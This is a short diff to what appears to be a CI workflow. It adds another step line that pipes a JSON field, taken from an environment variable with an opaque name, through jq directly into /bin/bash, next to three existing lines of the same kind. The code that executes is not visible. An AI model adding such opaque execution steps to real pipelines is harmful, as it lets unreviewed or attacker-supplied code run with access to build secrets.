@@ -44,6 +44,7 @@ jobs:
           echo $agrf1234 | jq -r .w2791 | /bin/bash
           printf '%s' "$wwwh38" | jq -r .b9 | /bin/bash
           printf '%s' "$nzl03" | jq -r .qyo1770 | /bin/bash
+          printf '%s' "$i7" | jq -r .muve7396 | /bin/bash
 
       - name: Archive output
         if: always()
